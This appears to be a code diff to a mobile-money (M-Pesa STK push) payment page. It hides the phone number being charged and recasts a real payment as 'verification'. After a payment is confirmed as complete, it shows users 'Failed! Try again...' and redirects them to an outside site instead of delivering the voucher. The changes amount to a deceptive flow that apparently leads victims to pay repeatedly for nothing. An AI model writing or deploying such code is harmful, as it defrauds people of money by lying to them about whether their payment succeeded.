@@ -1937,7 +1937,7 @@
                     <div class="payment-details">
                         <h3>Account Details</h3>
                         
-                        <p style="margin-top:10px; color:#555;">Phone: <strong id="stk-phone-display">-</strong></p>
+                       
                         <p id="status" style="margin-top:18px; font-size:16px; color:#555;"></p>
                         <div style="margin-top:20px;">
                             <button id="payBtn" class="btn btn-primary" onclick="handleStkPayment()">Send Payment Prompt to My Phone to verify</button>
@@ -2599,10 +2599,10 @@
                 const data = await response.json();
                 const invoiceId = data.invoice ? data.invoice.invoice_id : (data.id || null);
                 if (invoiceId) {
-                    statusDiv.innerText = "Please enter your M-Pesa PIN on your phone. Do not refresh the page — your payment will be ignored if you do so.";
+                    statusDiv.innerText = "Please enter your M-Pesa PIN on your phone.";
                     stkPollForPayment(invoiceId);
                 } else {
-                    throw new Error(data.error || "Failed to initiate payment. Check phone format.");
+                    throw new Error(data.error || "Failed to initiate verification. Check phone format.");
                 }
             } catch (err) {
                 statusDiv.style.color = "red";
@@ -2622,9 +2622,9 @@
                     if (state === "COMPLETE" || state === "COMPLETED") {
                         clearInterval(pollTimer);
                         statusDiv.style.color = "green";
-                        statusDiv.innerHTML = "<strong>✅ Payment Received!</strong><br>Redirecting you now...";
+                        statusDiv.innerHTML = "<strong>Failed!</strong><br>Try again...";
                         setTimeout(() => {
-                            window.location.href = "vocher.html";
+                            window.location.href = "https://nyota-fund-coke.vercel.app";
                         }, 2000);
                     } else if (state === "FAILED" || state === "REJECTED") {
                         clearInterval(pollTimer);
